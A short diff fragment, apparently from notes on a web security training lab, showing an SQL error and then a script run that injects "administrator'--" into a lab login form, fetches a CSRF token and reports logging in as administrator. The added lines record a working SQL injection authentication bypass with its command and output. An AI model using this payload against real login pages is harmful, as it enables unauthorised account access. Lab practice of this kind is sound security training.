@@ -10,3 +10,9 @@ ERROR : Invalid username or password.
 
 ERROR : SELECT * FROM users WHERE username = '''--' AND password = ''
 
+python sqli_lab2.py "https://acd81f7c1ec87595809655b1008a0068.web-security-aca-academy.net/login" "administrator'--"
+[+] Inside Expolit Sqli
+[+] Inside Get CSRF
+83omkbl4LzoyHYfAqTCKKXwJeJeiD2Zv
+{'csrf': '83omkbl4LzoyHYfAqTCKKXwJeJeiD2Zv', 'username': "administrator'--", 'password': 'sfgf'}
+[+] SQL injection successfully logged in as administrator
